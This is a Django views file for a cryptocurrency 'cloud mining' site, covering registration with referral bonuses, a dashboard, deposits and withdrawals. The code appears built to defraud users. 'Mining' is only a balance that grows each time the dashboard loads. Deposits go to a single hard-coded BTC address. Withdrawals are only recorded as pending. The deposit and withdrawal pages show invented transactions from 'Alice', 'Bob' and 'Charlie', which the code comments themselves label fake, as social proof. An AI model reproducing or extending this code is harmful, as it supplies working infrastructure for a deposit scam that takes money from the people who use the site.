from django.shortcuts import render, redirect
from django.contrib.auth import login, authenticate, logout
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
from django.contrib.auth.decorators import login_required
from .models import Profile, Deposit, Withdraw
from django.core.mail import send_mail
from django.conf import settings
from django.utils import timezone
import random

def register_view(request):
    ref = request.GET.get('ref')
    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            user = form.save()
            login(request, user)
            if ref:
                try:
                    ref_user = Profile.objects.get(referral_code=ref).user
                    profile = user.profile
                    profile.referred_by = ref_user
                    ref_user.profile.mining_speed += 0.2
                    ref_user.profile.save()
                    profile.save()
                except:
                    pass
            return redirect('dashboard')
    else:
        form = UserCreationForm()
    return render(request, 'register.html', {'form': form})

def login_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            login(request, form.get_user())
            return redirect('dashboard')
    else:
        form = AuthenticationForm()
    return render(request, 'login.html', {'form': form})

def logout_view(request):
    logout(request)
    return redirect('login')

@login_required
def dashboard_view(request):
    profile, created = Profile.objects.get_or_create(user=request.user)
    profile.mined_amount += profile.mining_speed * 0.00001
    profile.save()
    referral_link = request.build_absolute_uri(f"/register/?ref={profile.referral_code}")
    referral_count = profile.user.referrals.count() 
    return render(request, 'dashboard.html', {
        'profile': profile,
        'referral_link': referral_link,
        'referral_count': referral_count,
    })

@login_required
def deposit_view(request):
    if request.method == 'POST':
        amount = float(request.POST['amount'])
        if amount >= 2:
            Deposit.objects.create(user=request.user, amount=amount, status='Pending')
            return redirect('dashboard')
    # Dépôts réels de l'utilisateur
    user_deposits = Deposit.objects.filter(user=request.user).order_by('-date')[:5]
    # Dépôts factices (exemple)
    fake_deposits = [
        {'username': 'Alice', 'amount': 10, 'date': '2025-08-10', 'status': 'Confirmed'},
        {'username': 'Bob', 'amount': 5, 'date': '2025-08-09', 'status': 'Confirmed'},
        {'username': 'Charlie', 'amount': 2, 'date': '2025-08-08', 'status': 'Pending'},
    ]
    return render(request, 'deposit.html', {
        "btc_address": "13ZYu5dRtP8kHrunXXHuDMBoRwaLAr6MCE",
        "user_deposits": user_deposits,
        "fake_deposits": fake_deposits,
    })

@login_required
def withdraw_view(request):
    if request.method == 'POST':
        amount = float(request.POST['amount'])
        btc_address = request.POST['btc_address']
        if amount >= 10 and btc_address:
            Withdraw.objects.create(
                user=request.user,
                amount=amount,
                btc_address=btc_address,
                status='Pending'
            )
            return redirect('dashboard')
    # Retraits réels de l'utilisateur
    user_withdraws = Withdraw.objects.filter(user=request.user).order_by('-date')[:5]
    # Retraits factices (exemple)
    fake_withdraws = [
        {'username': 'Alice', 'amount': 20, 'date': '2025-08-10', 'status': 'Confirmed'},
        {'username': 'Bob', 'amount': 15, 'date': '2025-08-09', 'status': 'Confirmed'},
        {'username': 'Charlie', 'amount': 10, 'date': '2025-08-08', 'status': 'Pending'},
    ]
    return render(request, 'withdraw.html', {
        "user_withdraws": user_withdraws,
        "fake_withdraws": fake_withdraws,
    })
